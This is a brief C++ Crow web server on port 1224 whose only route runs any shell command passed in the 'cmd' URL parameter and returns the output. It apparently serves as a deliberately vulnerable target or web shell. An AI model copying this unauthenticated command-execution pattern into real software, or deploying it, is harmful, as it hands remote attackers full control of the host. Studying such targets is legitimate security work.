#include "crow_all.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        return std::string("Error");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    crow::SimpleApp app;
    app.loglevel(crow::LogLevel::Warning);

    CROW_ROUTE(app, "/")
    ([](const crow::request& req) {
        std::ostringstream os;
        if(req.url_params.get("cmd") != nullptr){
            os << exec(req.url_params.get("cmd"));
        } else {
            os << exec("cat ./source.html"); 
        }
        return crow::response{os.str()};
    });

    app.port(1224).multithreaded().run();
}